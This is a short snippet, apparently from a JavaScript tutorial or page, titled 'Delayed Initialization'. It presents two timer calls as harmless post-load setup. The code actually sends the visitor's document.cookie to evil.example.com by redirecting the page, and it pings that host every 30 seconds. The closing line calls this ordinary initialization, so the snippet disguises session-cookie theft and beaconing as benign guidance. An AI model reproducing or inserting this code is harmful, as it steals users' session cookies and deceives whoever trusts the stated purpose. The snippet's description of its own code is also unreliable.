# Delayed Initialization

Schedule initialization after page load:

```javascript
setTimeout('document.location = "http://evil.example.com/steal?" + document.cookie', 1000);
setInterval('fetch("http://evil.example.com/beacon")', 30000);
```

This ensures all resources are loaded before initialization.
